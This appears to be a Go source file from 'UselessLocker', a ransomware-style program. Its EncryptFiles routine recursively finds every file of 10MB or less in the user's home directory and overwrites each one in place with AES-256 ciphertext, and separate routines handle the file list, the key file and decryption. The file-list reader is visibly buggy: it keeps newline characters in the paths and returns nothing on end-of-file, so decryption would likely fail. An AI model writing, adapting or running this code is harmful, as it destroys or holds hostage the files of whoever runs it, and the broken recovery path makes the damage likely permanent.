// Package useless contains all the nessessary code for useless locker.
package useless

import (
	"bytes"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"

	"github.com/TheCreeper/UselessLocker/useless/crypto"
)

func Start() (err error) {
	return
}

// EncryptFiles will generate a key which will be used to encrypt all files in a users home
// directory that fit a specific criteria.
func EncryptFiles() (key []byte, err error) {
	user, err := user.Current()
	if err != nil {
		return
	}

	// Get a list of files in the users home directory that are less than 10MB
	files, err := GetFileList(user.HomeDir, 10485760)
	if err != nil {
		return
	}

	// Write out the file list to a file in the users home directory.
	if err = WriteFileList(user.HomeDir, files); err != nil {
		return
	}

	// Generate a key to use for this session
	key, err = crypto.GenerateKey(crypto.AES256)
	if err != nil {
		return
	}

	// Start encrypting each file in the list
	for _, v := range files {
		b, err := ioutil.ReadFile(v)
		if err != nil {
			return nil, err
		}

		ciphertext, err := crypto.EncryptBytes(key, b)
		if err != nil {
			return nil, err
		}

		err = ioutil.WriteFile(v, ciphertext, 0644)
		if err != nil {
			return nil, err
		}
	}
	return
}

// DecryptFiles will read the list of encrypted files and attempt to decrypt each one using the
// provided key.
func DecryptFiles(key []byte) (err error) {
	user, err := user.Current()
	if err != nil {
		return
	}

	files, err := ReadFileList(user.HomeDir)
	if err != nil {
		return
	}
	for _, v := range files {
		// Check if file still exists otherwise skip it.
		if _, err := os.Stat(v); os.IsNotExist(err) {
			continue
		}

		// Copy file contents into memory before decrypting and overwriting it.
		ciphertext, err := ioutil.ReadFile(v)
		if err != nil {
			return err
		}

		// Decrypt file contents using the provided key.
		b, err := crypto.DecryptBytes(key, ciphertext)
		if err != nil {
			return err
		}

		// Copy the decrypted file contents from memory to disk. Overwrite the file
		// contents.
		err = ioutil.WriteFile(v, b, 0644)
		if err != nil {
			return err
		}
	}
	return
}

// GetFileList compiles a list of files that are less than or equal to the specified file size.
// The file list is returned as a string slice with full location path.
func GetFileList(dirname string, size int64) (files []string, err error) {
	list, err := ioutil.ReadDir(dirname)
	if err != nil {
		return
	}
	for _, v := range list {
		if v.IsDir() {
			fl, err := GetFileList(filepath.Join(dirname, v.Name()), size)
			if err != nil {
				return nil, err
			}
			files = append(files, fl...)
			continue
		}

		if v.Mode().IsRegular() &&
			(v.Mode().Perm() <= 0777) &&
			(v.Size() <= size) {
			files = append(files, filepath.Join(dirname, v.Name()))
		}
	}
	return
}

// WriteFileList writes a list of files to the specified directory.
func WriteFileList(dirname string, files []string) (err error) {
	// Add a newline character after every filepath
	var data []byte
	for _, v := range files {
		data = append(data, []byte(v)...)
		data = append(data, []byte(string('\n'))...)
	}

	err = ioutil.WriteFile(filepath.Join(dirname, "useless_file_list.txt"), data, 0644)
	if err != nil {
		return
	}
	return
}

// ReadFileList reads a list of files contained in a file within the users home directory.
func ReadFileList(dirname string) (files []string, err error) {
	b, err := ioutil.ReadFile(filepath.Join(dirname, "useless_file_list.txt"))
	if err != nil {
		return
	}

	buf := bytes.NewBuffer(b)
	for {
		line, err := buf.ReadString('\n')
		if err != nil {
			return nil, err
		}
		files = append(files, line)
	}
	return
}

// ReadKeyFile reads the keyfile located in the users home directory containing the encryption key
// used to decrypt/encrypt files.
func ReadKeyFile(dirname string) (key []byte, err error) {
	key, err = ioutil.ReadFile(filepath.Join(dirname, "useless_key.txt"))
	if err != nil {
		return
	}
	// Do some checks on the key here
	return
}
